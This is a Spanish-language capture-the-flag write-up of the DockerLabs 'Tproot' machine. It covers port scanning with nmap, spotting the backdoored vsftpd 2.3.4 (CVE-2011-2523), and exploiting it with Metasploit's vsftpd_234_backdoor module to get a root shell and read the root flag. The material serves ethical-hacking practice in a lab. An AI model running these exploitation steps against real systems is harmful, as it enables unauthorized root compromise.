---
title: Tproot
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-02-14
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-tproot/tproot_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - ftp
  - http
  - tcp
  - cve
  - metasploit
  - information_gathering
  - cve_exploitation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/tproot:-$ ping -c 1 127.17.0.2 
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.057 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.057/0.057/0.057/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/tproot:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 127.17.0.2 -n -Pn -oG nmap1
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 21/open/tcp//ftp///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/tproot:-$ sudo nmap -sCV -p21,80 -vvv 127.17.0.2 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Unix
```
```terminal
/home/kali/Documents/dockerlabs/tproot:-$ whatweb 127.17.0.2
http://127.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[127.17.0.2], Title[Apache2 Ubuntu Default Page: It works]
```

El sitio web muestra la plantilla predeterminada de Apache sin información relevante.

![](assets/img/dockerlabs-writeup-tproot/tproot1.png)

Al verificar la versión de FTP, identifico una variante vulnerable y ampliamente conocida.

```terminal
/home/kali/Documents/dockerlabs/tproot:-$ searchsploit vsftpd 2.3.4
```

![](assets/img/dockerlabs-writeup-tproot/tproot2.png)

> La vulnerabilidad [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) ya fue abordada en la máquina [Firsthacking](https://litio7.github.io/posts/dockerlabs-writeup-firsthacking/) utilizando el exploit: '/unix/remote/49757.py'.
{: .prompt-tip }

---
## CVE Exploitation

En esta ocasión, emplearé Metasploit para explotar la vulnerabilidad CVE-2011-2523.

```terminal
/home/kali/Documents/dockerlabs/tproot:-$ sudo msfconsole

msf6 > search vsftpd 2.3.4
```

![](assets/img/dockerlabs-writeup-tproot/tproot3.png)

* Selecciono el módulo de explotación correspondiente.
* Configuró la dirección del objetivo 
* Y ejecutó el exploit.

```terminal
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 127.17.0.2
RHOSTS => 127.17.0.2

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```